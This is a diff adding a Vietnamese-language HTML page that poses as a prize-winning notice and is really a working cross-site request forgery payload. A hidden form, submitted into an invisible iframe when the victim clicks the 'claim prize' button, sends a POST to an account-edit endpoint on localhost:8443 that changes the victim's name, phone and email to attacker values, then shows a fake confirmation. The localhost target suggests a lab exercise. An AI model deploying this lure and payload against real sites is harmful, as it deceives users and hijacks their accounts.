@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Chúc mừng trúng thưởng!</title>
+    <meta charset="UTF-8">
+    <style>
+        #status {
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 Chúc mừng! 🎉</h1>
+    <p>Bạn là người may mắn trúng thưởng hôm nay!</p>
+    <p>Click vào Nhận Quà Ngay để xác nhận lần cuối!</p>
+
+    <form id="hackForm" action="https://localhost:8443/account/edit" method="POST" target="invisible" onsubmit="showStatus()">
+        <input type="hidden" name="fullname" value="HACK CSRF">
+        <input type="hidden" name="telephone" value="0112233445">
+        <input type="hidden" name="email" value="hacked@csrf.com">
+        <input type="hidden" name="activated" value="true">
+        <input type="hidden" name="admin" value="false">
+        <button type="submit">Nhận Quà Ngay Nào!</button>
+    </form>
+
+    <iframe name="invisible" style="display:none;"></iframe>
+
+    <p id="status"></p>
+
+    <script>
+        function showStatus() {
+            setTimeout(() => {
+                document.getElementById("status").innerText = "🎁 Đã xử lý! Vui lòng đợi thông báo tiếp theo.";
+            }, 500); // Đợi chút xíu để form gửi đi xong
+        }
+    </script>
+</body>
+</html>
